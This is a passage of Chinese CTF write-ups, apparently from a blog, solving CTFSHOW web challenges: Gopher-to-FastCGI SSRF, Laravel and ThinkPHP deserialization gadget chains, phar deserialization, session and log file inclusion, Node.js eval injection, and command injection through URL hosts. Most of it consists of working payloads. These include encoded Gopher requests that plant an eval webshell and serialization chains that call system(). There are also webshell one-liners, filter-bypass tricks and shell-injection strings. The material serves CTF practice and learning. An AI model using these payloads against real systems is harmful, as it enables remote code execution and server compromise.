用Gopher请求端口时，如果端口有服务在监听，则会接受连接并等待我们传输数据，此时连接会“卡住”一段时间；如果端口没有服务，则会立刻拒绝连接。通过是否出现等待，就能判断端口是否开放 方法跟之前一样，也是把结果写入Cookie，路径是/index.php，参数是service 扫描到9000的时候未响应，说明9000端口开放 可以用Gopher协议打FastCGI，工具也是Gopherus 1python2 gopherus.py --exploit fastcgi 输入以下内容 已知文件绝对路径：/var/www/html/index.php 待执行命令：echo &quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot; &gt; 1.php 得到结果： 1gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5C%04%00%3C%3Fphp%20system%28%27echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%201.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 payload： 123456789101112&lt;?phpclass dao{ private $config; public function __construct(){ $this-&gt;config=new config(); }}class config{ public $update_url = 'gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5C%04%00%3C%3Fphp%20system%28%27echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%201.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00';}$a= new dao();echo base64_encode(serialize($a)); 运行结果： 1TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo2NDk6ImdvcGhlcjovLzEyNy4wLjAuMTo5MDAwL18lMDElMDElMDAlMDElMDAlMDglMDAlMDAlMDAlMDElMDAlMDAlMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDElMDQlMDQlMDAlMEYlMTBTRVJWRVJfU09GVFdBUkVnbyUyMC8lMjBmY2dpY2xpZW50JTIwJTBCJTA5UkVNT1RFX0FERFIxMjcuMC4wLjElMEYlMDhTRVJWRVJfUFJPVE9DT0xIVFRQLzEuMSUwRSUwMkNPTlRFTlRfTEVOR1RIOTIlMEUlMDRSRVFVRVNUX01FVEhPRFBPU1QlMDlLUEhQX1ZBTFVFYWxsb3dfdXJsX2luY2x1ZGUlMjAlM0QlMjBPbiUwQWRpc2FibGVfZnVuY3Rpb25zJTIwJTNEJTIwJTBBYXV0b19wcmVwZW5kX2ZpbGUlMjAlM0QlMjBwaHAlM0EvL2lucHV0JTBGJTE3U0NSSVBUX0ZJTEVOQU1FL3Zhci93d3cvaHRtbC9pbmRleC5waHAlMEQlMDFET0NVTUVOVF9ST09ULyUwMCUwMCUwMCUwMCUwMSUwNCUwMCUwMSUwMCUwMCUwMCUwMCUwMSUwNSUwMCUwMSUwMCU1QyUwNCUwMCUzQyUzRnBocCUyMHN5c3RlbSUyOCUyN2VjaG8lMjAlMjIlM0MlM0ZwaHAlMjBldmFsJTI4JTVDJTI0X1BPU1QlNUIxJTVEJTI5JTNCJTNGJTNFJTIyJTIwJTNFJTIwMS5waHAlMjclMjklM0JkaWUlMjglMjctLS0tLU1hZGUtYnktU3B5RDNyLS0tLS0lMEElMjclMjklM0IlM0YlM0UlMDAlMDAlMDAlMDAiO319 把结果写入Cookie即可，路径是/index.php，参数是service 然后蚁剑连接即可 web310附件还是跟web308一样 方法和上题相同，也是用Gopher协议打FastCGI 把结果写入Cookie，路径是/index.php，参数是service 连接蚁剑webshell，但是这次flag不在/var/www/html 找了一下，发现flag在/var/flag目录 参考Jay 17：https://blog.csdn.net/Jayjay___/article/details/133146315","link":"/posts/ctfshow-code-audit-web301-web310/"},{"title":"CTFSHOW 框架复现 web466 - web476","text":"题目列表web466参考文章：代码审计学习—Laravel5.4 做题前一定要先看一遍漏洞复现，自行跟着去验证一下 第一条链子因为Faker\\Generator.php里有个__wakeup()，反序列化时会把formatters数组清空，用不了 所以这里我们用第二条链子 123456789101112131415161718192021222324&lt;?phpnamespace Illuminate\\Validation { class Validator { public $extensions = []; public function __construct() { $this-&gt;extensions = ['' =&gt; 'system']; } }}namespace Illuminate\\Broadcasting { use Illuminate\\Validation\\Validator; class PendingBroadcast { protected $events; protected $event; public function __construct($cmd) { $this-&gt;events = new Validator(); $this-&gt;event = $cmd; } } echo base64_encode(serialize(new PendingBroadcast('cat /flag')));}?&gt; 运行得到结果 1Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MzE6IklsbHVtaW5hdGVcVmFsaWRhdGlvblxWYWxpZGF0b3IiOjE6e3M6MTA6ImV4dGVuc2lvbnMiO2E6MTp7czowOiIiO3M6Njoic3lzdGVtIjt9fXM6ODoiACoAZXZlbnQiO3M6OToiY2F0IC9mbGFnIjt9 然后GET传入/admin/序列化数据即可 web467参考文章：Laravel5.4 反序列化漏洞挖掘 这里面第一条链子和第二条链子在题目里面用不了 用第三条链子 12345678910111213141516171819202122232425262728&lt;?phpnamespace Illuminate\\Broadcasting{ use Illuminate\\Events\\Dispatcher; class PendingBroadcast { protected $events; protected $event; public function __construct($cmd) { $this-&gt;events = new Dispatcher($cmd); $this-&gt;event=$cmd; } } echo base64_encode(serialize(new PendingBroadcast($argv[1])));}namespace Illuminate\\Events{ class Dispatcher { protected $listeners; public function __construct($event){ $this-&gt;listeners=[$event=&gt;['system']]; } }} 保存文件为1.php，在终端执行命令php 1.php &quot;cat /flag&quot;，得到结果 1Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086Mjg6IklsbHVtaW5hdGVcRXZlbnRzXERpc3BhdGNoZXIiOjE6e3M6MTI6IgAqAGxpc3RlbmVycyI7YToxOntzOjk6ImNhdCAvZmxhZyI7YToxOntpOjA7czo2OiJzeXN0ZW0iO319fXM6ODoiACoAZXZlbnQiO3M6OToiY2F0IC9mbGFnIjt9 同样的，GET传入/admin/序列化数据得到flag web468参考文章：laravel5.4反序列化 - Shivers0x72 用第二个方法，也就是src/Illuminate/Support/Manager.php那个 1234567891011121314151617181920212223242526272829303132&lt;?phpnamespace Illuminate\\Broadcasting{ use Illuminate\\Notifications\\ChannelManager; class PendingBroadcast { protected $events; public function __construct($cmd) { $this-&gt;events = new ChannelManager($cmd); } } $seri = new PendingBroadcast('cat /flag'); echo base64_encode(serialize($seri));}namespace Illuminate\\Notifications{ class ChannelManager { protected $app; protected $defaultChannel; protected $customCreators; public function __construct($cmd) { $this-&gt;defaultChannel = '1'; $this-&gt;customCreators = array('1' =&gt; 'system'); $this-&gt;app = $cmd; } }}?&gt; 得到结果 1Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6OToiY2F0IC9mbGFnIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiIxIjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntpOjE7czo2OiJzeXN0ZW0iO319fQ== 运行后会弹出一个调试页面，大概意思就是代码中尝试对一个字符串类型的变量调用对象的方法dispatch()，但是字符串类型本身没有dispatch()这个方法，所以导致错误 不影响，直接查看网页源码即可 web469也是参考上一题的文章：laravel5.4反序列化 - Shivers0x72 用最后一个方法，也就是src/Faker/ValidGenerator.php那个 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpnamespace Illuminate\\Broadcasting{ use Faker\\ValidGenerator; class PendingBroadcast { protected $events; public function __construct($cmd) { $this-&gt;events = new ValidGenerator($cmd); } } $seri = new PendingBroadcast('cat /flag'); echo base64_encode(serialize($seri));}namespace Faker{ use Faker\\DefaultGenerator; class ValidGenerator { protected $maxRetries; protected $validator; protected $generator; public function __construct($cmd) { $this-&gt;generator = new DefaultGenerator($cmd); $this-&gt;maxRetries = 10000000; $this-&gt;validator = 'system'; } }}namespace Faker{ class DefaultGenerator { protected $default; public function __construct($cmd) { $this-&gt;default = $cmd; } }}?&gt; 得到结果 1Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086MjA6IkZha2VyXFZhbGlkR2VuZXJhdG9yIjozOntzOjEzOiIAKgBtYXhSZXRyaWVzIjtpOjEwMDAwMDAwO3M6MTI6IgAqAHZhbGlkYXRvciI7czo2OiJzeXN0ZW0iO3M6MTI6IgAqAGdlbmVyYXRvciI7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7czo5OiJjYXQgL2ZsYWciO319fQ== web470跟上题方法一样，传入 1Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086MjA6IkZha2VyXFZhbGlkR2VuZXJhdG9yIjozOntzOjEzOiIAKgBtYXhSZXRyaWVzIjtpOjEwMDAwMDAwO3M6MTI6IgAqAHZhbGlkYXRvciI7czo2OiJzeXN0ZW0iO3M6MTI6IgAqAGdlbmVyYXRvciI7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7czo5OiJjYXQgL2ZsYWciO319fQ== 得到flag web471参考文章：laravel5.8 反序列化漏洞复现 用方法一，但是最后的输出要改一下，改成base64编码 123456789101112131415161718192021222324252627282930313233343536&lt;?phpnamespace Illuminate\\Broadcasting{ use Illuminate\\Bus\\Dispatcher; use Illuminate\\Foundation\\Console\\QueuedCommand; class PendingBroadcast { protected $events; protected $event; public function __construct(){ $this-&gt;events=new Dispatcher(); $this-&gt;event=new QueuedCommand(); } }}namespace Illuminate\\Foundation\\Console{ class QueuedCommand { public $connection=&quot;cat /flag&quot;; }}namespace Illuminate\\Bus{ class Dispatcher { protected $queueResolver=&quot;system&quot;; }}namespace{ use Illuminate\\Broadcasting\\PendingBroadcast; echo base64_encode(serialize(new PendingBroadcast()));} 运行得到结果 1Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7Tzo0MzoiSWxsdW1pbmF0ZVxGb3VuZGF0aW9uXENvbnNvbGVcUXVldWVkQ29tbWFuZCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czo5OiJjYXQgL2ZsYWciO319 运行后会弹出调试页面，大概意思是在调用 dispatchToQueue 方法时，尝试通过队列解析器（queueResolver）来获取一个队列实例（Queue对象），但实际得到的不是实现了 Queue 接口的对象，而是其他类型（如字符串、null或其他非队列对象） 但是不影响命令执行，查看网页源码 web472可以继续用上题的payload，也可以学学新思路，但感觉方法都差不多 版本升到laravel8了，参考文章：Laravel 8 反序列化分析_laravel dispatch 要改一下格式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpnamespace Illuminate\\Broadcasting { use Illuminate\\Contracts\\Events\\Dispatcher; class PendingBroadcast { protected $event; protected $events; public function __construct($events, $event) { $this-&gt;event = $event; $this-&gt;events = $events; } }}namespace Illuminate\\Bus { class Dispatcher { protected $queueResolver; public function __construct($queueResolver) { $this-&gt;queueResolver = $queueResolver; } }}namespace Illuminate\\Broadcasting { class BroadcastEvent { public $connection; public function __construct($connection) { $this-&gt;connection = $connection; } }}namespace { $c = new Illuminate\\Broadcasting\\BroadcastEvent('cat /flag'); $a = new Illuminate\\Bus\\Dispatcher('system'); $b = new Illuminate\\Broadcasting\\PendingBroadcast($a, $c); echo base64_encode(serialize($b));} 得到结果 1Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6OToiY2F0IC9mbGFnIjt9czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9fQ== 同样也是GET传入/admin/序列化数据 web473参考文章：ThinkPHP 5.0.15 SQL注入漏洞 题目给出了thinkphp5.0.15默认控制器的部分代码，使用默认路由 123456public function inject(){ $a=request()-&gt;get('a/a'); db('users')-&gt;insert(['username'=&gt;$a]); return 'done'; } 然后payload要改为 1?a[0]=inc&amp;a[1]=(select load_file('/flag'))&amp;a[2]=1 我们用兼容模式传入路径 1/index.php?s=index/index/inject&amp;a[0]=inc&amp;a[1]=(select load_file('/flag'))&amp;a[2]=1 兼容模式也就是index.php?s=模块/控制器/方法&amp;参数，当然还有pathinfo模式，通过index.php/模块/控制器/方法?参数 形式传递，但是这里我用pathinfo模式失败了 得到flag web474参考文章：Thinkphp cache缓存函数远程代码执行漏洞 题目给出thinkphp5.0.5默认控制器的部分代码，使用默认路由 1234public function rce(){ Cache::set(&quot;cache&quot;,input('get.cache')); return 'done'; } payload： 1public/index.php?s=index/index/rce&amp;cache=%0d%0asystem('cat /flag');// 写入之后我们要访问文件，因为cache的md5值为0fea6a13c52b4d4725368f24b045ca84，根据文章可知，文件的存放路径为/runtime/cache/0f/ea6a13c52b4d4725368f24b045ca84.php，我们拼接访问该路径 得到flag web475后面两题题目备注thinkphp 5.0.0-5.0.23 rce，范围很大，可以自行测试Poc，这里我直接用工具做了 下载地址：bewhale/thinkphp_gui_tools: ThinkPHP漏洞综合利用工具 先检测看存在什么类型漏洞，然后一个个尝试，扫描/public/index.php不行，要扫描目录/public 得到flag web476跟上面一样","link":"/posts/ctfshow-framework-exploits-web466-web476/"},{"title":"CTFSHOW 中期测评（二）web502 - web516","text":"题目列表web502先万能密码登录 打开数据库备份功能页面 打开网页源码，可以看到POST请求是发送到api/admin_db_backup.php的 查看api/admin_db_backup.php源码，GET请求/index.php?action=../api/admin_db_backup 相比上题，这里的正则改成了preg_match('/^(zip|tar|sql)$/', $db_format)，要求$db_format只能严格匹配 “zip”、”tar”、”sql” 这三个字符串，任何多余字符都不会通过，那我们换个方法，可以利用$pre进行变量覆盖然后分号截断执行命令 payload： 1db_format=zip&amp;pre=1.txt;cat /f*&gt;/var/www/html/1.txt; 最后访问/1.txt读取flag即可 web503$pre和$db_format被md5包裹了，无法利用了 然后上面可以看到有个file_exists函数，先记着，后面会用到 用万能密码登录首页后，在系统配置功能处可以看到有个图片上传功能 查看源码看到有个api/admin_upload.php，跟文件上传功能有关 我们看看源码，GET传参/index.php?action=../api/admin_upload，这里只截取关键代码 123456789101112131415if($user){ $arr = $_FILES[&quot;file&quot;]; if(($arr[&quot;type&quot;]==&quot;image/jpeg&quot; || $arr[&quot;type&quot;]==&quot;image/png&quot; ) &amp;&amp; $arr[&quot;size&quot;]&lt;10241000 ) { $arr[&quot;tmp_name&quot;]; $filename = md5($arr['name']); $ext = pathinfo($arr['name'],PATHINFO_EXTENSION); if(!preg_match('/^php$/i', $ext)){ $basename = &quot;../img/&quot;.$filename.'.' . $ext; move_uploaded_file($arr[&quot;tmp_name&quot;],$basename); $config = unserialize(file_get_contents(__DIR__.'/../config/settings')); $config['logo']=$filename.'.' . $ext; file_put_contents(__DIR__.'/../config/settings', serialize($config)); $ret['msg']='文件上传成功'; } 这里判断文件 MIME 类型是否是 JPEG 或 PNG，并且文件大小要小于10MB，且禁止扩展名为“php”的文件上传，然后对内容进行反序列化。结合前面/api/admin_db_backup.php的file_exists函数，我们可以用phar反序列化来做 这里要用到之前题目讲的反序列化，具体可以参考web493，setStub那里要加个GIF89a来伪装图片 payload： 1234567891011121314151617&lt;?phpclass dbLog{ public $sql; public $content = '&lt;?php eval($_POST[1]);?&gt;'; public $log = '1.php';}$a = new dbLog();$phar = new Phar('a.phar');$phar -&gt; startBuffering();$phar -&gt; addFromString('test.txt','test');$phar -&gt; setStub('GIF89a'.'&lt;?php __HALT_COMPILER(); ?&gt;');$phar -&gt; setMetadata($a);$phar -&gt; stopBuffering(); ?&gt; 运行后当前目录会生成一个a.phar文件，修改文件后缀名为png，然后上传到系统配置那里 右键图像复制图像链接，例如我这边是/img/32d3ca5e23f4ccf1e4c8660c40e75f33.png，接着我们要借用file_exists来触发phar反序列化，如图所示发包 1pre=phar:///var/www/html/img/32d3ca5e23f4ccf1e4c8660c40e75f33&amp;db_format=.png 最后再蚁剑连接即可 根目录找到flag web504这次发现这里多了模板添加功能，但是查看不了源码 可以上传文件 参考我们之前做的web499，可以尝试写序列化代码到config/settings，等网页加载时会进行反序列化然后生成木马 payload： 123456789101112&lt;?phpclass dbLog{ public $sql; public $content = '&lt;?php eval($_POST[1]);?&gt;'; public $log = '2.php';}$a = new dbLog();echo serialize($a);?&gt; 得到结果 1O:5:&quot;dbLog&quot;:3:{s:3:&quot;sql&quot;;N;s:7:&quot;content&quot;;s:24:&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;s:3:&quot;log&quot;;s:5:&quot;2.php&quot;;} 然后进行上传，如图所示 这时点击系统配置功能处，可以看到内容已经写入，并覆盖了原来的内容 蚁剑连接2.php 根目录找到flag web505这次文件上传不了，应该是后端做了校验 但是发现多了一个文件查看功能，可以查看文件源码 我们看看api/admin_templates.php源码，可以看到把settings过滤了 在文件查看功能处查看源码，找到api/admin_file_view.php，我们看看源码 关键源码 123456789if($user){ extract($_POST); if($debug==1 &amp;&amp; preg_match('/^user/', file_get_contents($f))){ include($f); }else{ $ret['data']=array('contents'=&gt;file_get_contents(__DIR__.'/../'.$name)); } $ret['msg']='查看成功'; die(json_encode($ret)); 可以看到当满足$debug==1且$f以user开头，就用include进行文件包含。我们可以用data伪协议来做，然后发送内容到api/admin_file_view.php payload： 1debug=1&amp;f=data://text/plain,user&lt;?php system('cat /f*');?&gt; 结果如图所示 web506这题的api/admin_file_view.php相比上题，多了一个判断文件名后缀的代码，取 $f 文件名的最后三个字符，如果扩展名是 php、sml 或 phar（不区分大小写），则直接返回提示、终止流程 不过不影响，我们用的是data伪协议，步骤跟上题一样 1debug=1&amp;f=data://text/plain,user&lt;?php system('cat /f*');?&gt; web507api/admin_file_view.php没变，继续用上题方法 1debug=1&amp;f=data://text/plain,user&lt;?php system('cat /f*');?&gt; web508这次把伪协议禁了，不能直接写伪协议，不过我们可以换个方法，用一个文件来当中转站执行命令 在系统配置那里可以看到有个网站Logo上传，可以用这个当中转站 随便上传一张图片，抓包，然后修改内容为user&lt;?php system('cat /f*');?&gt;，重新发包 然后回到网页，右键复制图像链接，发送POST请求到api/admin_file_view.php，如图所示 1debug=1&amp;f=/var/www/html/img/4a47a0db6e60853dedfcfdf08a5ca249.png web509这次api/admin_upload.php会对文件内容进行校验 用短回显标签和反引号绕过即可 1user&lt;?=`cat /f*`?&gt; 右键复制图像链接，发送POST请求到api/admin_file_view.php 1debug=1&amp;f=/var/www/html/img/4a47a0db6e60853dedfcfdf08a5ca249.png web510这次文件上传限制很严格，换个方法 通过分析，发现个人信息修改处存在漏洞 我们看看api/admin_edit.php对应的源码 回到个人信息处查看源码，显示昵称对应的就是nickname，那我们可以用session文件包含来做这题 看看对应的session文件，在cookie复制PHPSESSID的值，然后拼接访问，如图 刚好前面有个user，符合api/admin_file_view.php的要求，我们在名称修改处传入一句话木马，然后进行文件包含即可 剩余的步骤跟之前一样，发送POST请求到api/admin_file_view.php 1debug=1&amp;f=/tmp/sess_k9u1ni1spqatv8uvt3acr416o6&amp;1=system('cat /f*'); web511这次把sess也过滤了 一个个分析其他代码，发现render/render_class.php有个eval函数 我们看看能不能利用，也是同一个文件，在上面可以看到shade函数调用了checkVar，然后render函数调用了shade 后面在index.php发现调用了render，GET传入?action=view&amp;page=1即可，关键是$user如何控制，且要求是个数组 继续分析，发现api/admin_edit.php可以控制user数组，那我们只要nickname传入要执行的命令，然后修改前面的模板占位符为{{var:nickname}}即可 修改nickname执行命令 然后打开新增模板功能，名称写1.sml，因为后面我们要GET传入?action=view&amp;page=1，要跟page对应，然后内容写1{{var:nickname}}，用于模板渲染。 加个1是因为render/render_class.php中if(stripos($templateContent, '{{var:'.$key.'}}')){这里有问题，如果是在开头匹配到的话会返回下标0，然后if(0)就不会进入语句块，也就无法执行eval，正确写法应该是 1if(stripos($templateContent, '{{var:'.$key.'}}') !== false){ 回归正题，我们传入内容如图所示 然后访问index.php?action=view&amp;page=1触发漏洞即可 web512这次render/render_class.php对$value过滤很严格，字符可以用字符串拼接绕过，然后因为括号()用不了，我们用include来包含文件，include是可以不用括号包裹直接用的 因为网站的php版本为5.6，且正则没有过滤花括号，可以用$_POST{1}来代替$_POST[1]，旧版 PHP 允许使用花括号 {} 访问数组某个键，比如 $_POST{1}，这是 PHP 早期版本的语法，但从 PHP 7.4 开始，花括号访问数组的语法被废弃并在 PHP 8.0 中移除 那我们要写入的命令为 1&lt;?php include $_POST{1};?&gt; 网上看别的师傅有一个很牛的方法，可以用heredoc语法来定义长字符串，它允许开发者定义多行字符串而不需要使用引号，也不用为引号、换行符等转义，非常方便地写包含多行HTML、SQL、代码片段等内容的字符串，格式为 123$变量名 = &lt;&lt;&lt;标识符多行字符串内容标识符; &lt;&lt;&lt; 是heredoc开始的标记，后面跟一个自定义的标识符，直到文件中某一行独立写着完全相同的结束标识符就结束，结束标识符后必须加分号;结束 这里要用到之前的反序列化知识，具体可以回顾web493 payload： 12345678910111213141516171819username=admin&amp;nickname=1;$a=&lt;&lt;&lt;ctf&lt;?php includctf;$b=&lt;&lt;&lt;ctfe $ctf;$c=&lt;&lt;&lt;ctf_POSctf;$d=&lt;&lt;&lt;ctfT{1};?&gt;ctf;$n=&lt;&lt;&lt;ctf1.phpctf;$e=clone $db;$e-&gt;log-&gt;log=$n;$e-&gt;log-&gt;content=$a.$b.$c.$d; POST发包到api/admin_edit.php 然后跟上题一样新增模板，模板在后端渲染后会生成1.php 12名称：1.sml内容：1{{var:nickname}} 访问1.php，然后用data伪协议执行命令即可 11=data://text/plain,&lt;?php system('cat /f*'); web513这次过滤更加严格了，那咱们换个方法 发现下面多了一个checkFoot函数，具体代码如下 123456789101112public static function checkFoot($templateContent){ if ( stripos($templateContent, '{{cnzz}}')) { $config = unserialize(file_get_contents(__DIR__.'/../config/settings')); $foot = $config['cnzz']; if(is_file($foot)){ $foot=file_get_contents($foot); include($foot); } } return $templateContent;} 这里会读取config/settings的内容进行反序列化，根据前面的题目，对应的文件为api/admin_settings.php 也就是会把系统配置功能处的数据存入$config数组，然后$config['cnzz']对应的是页面统计 因为render/render_class.php有个$foot=file_get_contents($foot)，然后再进行include操作，那我们可以在页面统计放入一个文件地址，然后这个文件的内容是另一个文件的地址，这样就可以进行文件包含 先写一个模板到templates目录下，内容为/var/log/nginx/access.log 然后页面统计写/var/www/html/templates/1.sml 接着写入模板2.sml，内容为1{{cnzz}} 最后访问index.php?action=view&amp;page=2，成功读取到/var/log/nginx/access.log内容 然后进行日志文件执行命令即可，UA头写入一句话木马，读取flag web514这次加了过滤，可以用data伪协议来做 我们传入data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B，但是如果直接传入是不行的，因为有过滤 preg_match的话我们可以用数组绕过，因为preg_match的第二个参数（待匹配内容）必须是字符串，如果传入的是数组，preg_match会返回false而不是报错，如图所示传入 验证一下，可以看到成功写入了 剩余的步骤跟上题一样，系统配置页面的页面统计写入地址/var/www/html/templates/1.sml，然后新增模板2.sml，内容1{{cnzz}}，最后访问index.php?action=view&amp;page=2执行命令即可 web515先看代码 1234567891011121314151617181920212223var express = require('express');var _= require('lodash');var router = express.Router();/* GET users listing. */router.get('/', function(req, res, next) { res.render('index', { title: '我是复读机' });});router.post('/',function(req,res,next){ if(req.body.user!=null){ msg = req.body.user; if((msg.match(/proto|process|require|exec|var|'|&quot;|:|\\[|\\]|[0-9]/))!==null || msg.length&gt;40){ res.render('index', { title: '敏感信息不复读' }); }else{ res.render('index', { title: eval(msg) }); } }else{ res.render('index', { title: '我是复读机' }); } });module.exports = router; 之前做过类似的题，我们eval嵌套执行就好，GET传入 1index.php?a=require('child_process').spawnSync('cat',['/flag']).stdout.toString() 然后body传入 1user=eval(req.query.a) web516下载附件进行分析，其中关键代码为index.js里面的登录成功后显示处，会执行eval函数 但是app.js有限制 不能出现这些字符串，那我们用反引号拼接字符串就可以，还是用上题的代码，修改一下即可 payload： 11)+eval((`req`+`uire('child_pro`+`cess').spawnSync('ls',['/']).stdout.toString()`) 先进行注册 再点击sign in登录 成功执行命令 同理，我们修改一下执行命令env，成功找到flag 11)+eval((`req`+`uire('child_pro`+`cess').spawnSync('env').stdout.toString()`)","link":"/posts/ctfshow-mid-term-assessment-2-web502-web516/"},{"title":"CTFSHOW | 其他篇题解（一）web396 - web416","text":"前言由于题目比较多，所以分三个部分来写，这是第一部分 题目列表web396打开题目，可以看到给出了代码 会解析传入的URL，然后提取其中的host和path放入代码中执行 我们分析一下URL结构，举个例子 1https://www.example.com:8080/path/to/resource?user=alice#section1 部分 示例 说明 scheme https 协议（常见有http、https、ftp等） host www.example.com 主机地址/域名 port 8080 端口号（省略时默认http是80，https为443） path /path/to/resource 路径，资源在服务器的位置 query ?user=alice 查询参数 fragment #section1 页面锚点，供浏览器滚动到指定位置 回到题目，shell_exec函数可以执行系统命令，因此有很多方法可以做这题 方法一：反引号执行系统命令 用反引号执行系统命令，传入参数 1?url=http://`ls`/var/www/html/1.txt 然后打开1.txt查看结果 直接读取flag即可 1?url=http://`cat fl0g.php`/var/www/html/1.txt 方法二：$()执行系统命令 在Shell脚本或命令行里，$()语法可以用来执行系统命令。它的作用叫“命令替换”：会把括号里的命令先执行，然后用输出结果代替$()这个表达式的内容 读取当前目录内容 1?url=http://$(ls)/var/www/html/1.txt 读取flag 1?url=http://$(cat fl0g.php)/var/www/html/1.txt 方法三：分号截断命令 可以用分号截断当前命令，然后执行新命令，可以直接写文件、写webshell，或者反弹shell都可以，看你喜欢哪个 读取当前目录内容 1?url=http://1/1;echo `ls` &gt; 1.txt 读取flag 1?url=http://1/1;echo `cat fl0g.php` &gt; 1.txt web397这次把内容写进了/tmp目录里 因为/tmp是在根目录，用../返回上一级即可，方法跟之前一样 方法一：反引号执行系统命令 读取当前目录内容 1?url=http://`ls`/../var/www/html/1.txt 读取flag 1?url=http://`cat fl0g.php`/../var/www/html/1.txt 方法二：$()执行系统命令 读取当前目录内容 1?url=http://$(ls)/../var/www/html/1.txt 读取flag 1?url=http://$(cat fl0g.php)/../var/www/html/1.txt 方法三：分号截断命令 读取当前目录内容 1?url=http://1/1;echo `ls` &gt; 1.txt 读取flag 1?url=http://1/1;echo `cat fl0g.php` &gt; 1.txt web398对host部分过滤了分号，方法三用不了，其他步骤跟web397一样 方法一：反引号执行系统命令 读取当前目录内容 1?url=http://`ls`/../var/www/html/1.txt 读取flag 1?url=http://`cat fl0g.php`/../var/www/html/1.txt 方法二：$()执行系统命令 读取当前目录内容 1?url=http://$(ls)/../var/www/html/1.txt 读取flag 1?url=http://$(cat fl0g.php)/../var/www/html/1.txt web399对host过滤了分号和&gt;，影响的还是步骤三，步骤一和步骤二不影响 方法一：反引号执行系统命令 读取当前目录内容 1?url=http://`ls`/../var/www/html/1.txt 读取flag 1?url=http://`cat fl0g.php`/../var/www/html/1.txt 方法二：$()执行系统命令 读取当前目录内容 1?url=http://$(ls)/../var/www/html/1.txt 读取flag 1?url=http://$(cat fl0g.php)/../var/www/html/1.txt web400在web399的基础上多过滤了http和https，且不区分大小写，不过影响不大，步骤跟上题一样 方法一：反引号执行系统命令 读取当前目录内容 1?url=http://`ls`/../var/www/html/1.txt 读取flag 1?url=http://`cat fl0g.php`/../var/www/html/1.txt 方法二：$()执行系统命令 读取当前目录内容 1?url=http://$(ls)/../var/www/html/1.txt 读取flag 1?url=http://$(cat fl0g.php)/../var/www/html/1.txt 